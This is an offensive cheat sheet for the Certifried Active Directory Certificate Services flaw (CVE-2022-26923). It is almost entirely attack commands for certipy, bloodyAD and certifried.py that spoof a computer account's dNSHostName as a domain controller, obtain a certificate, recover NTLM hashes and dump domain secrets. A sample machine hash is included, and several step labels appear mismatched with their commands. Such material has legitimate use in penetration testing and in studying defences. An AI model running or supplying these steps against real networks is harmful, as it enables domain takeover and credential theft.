# Certifried CVE-2022-26923

### An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.

## Enumeration

 - certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'

### If Certipy doesn't print Certificate object SID is [...] after obtaining the certificate, then the attack can be conducted.

## Exploitation

#### 1) Clearing the SPNs

 - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname

#### 2) Setting the dNSHostName value to the name of a computer account to impersonate

 - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'

#### 3) Verifying the dNSHostName value and SPN entries

 - bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname

#### 4) Adding a computer account and setting the dNSHostName to impersonate

 - certipy account create -u "$USER"@"$DOMAIN" -p "$PASSWORD" -user "$COMPUTER_NAME" -pass "$COMPUTER_PASS" -dns "$DC_NAME.$DOMAIN"

## Alternate Method

#### 1) Request certificate manually

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 (Add the computer and update necessary attributes)

#### 2) Recover NTLM Hash

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-ldap (Request the certificate manually)

### Proceed with secretsdump

#### 3) After obtaining the NTLM hash, proceed with dumping secrets

 - python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump

#### 4) Modify computer account

 - python3 modify_computer.py range.net/ws01\$@192.168.86.182 -hashes :0e3ae07798e1bc9e02b049a795a7e69f (In case you obtain a machine account hash, modify the computer account.)
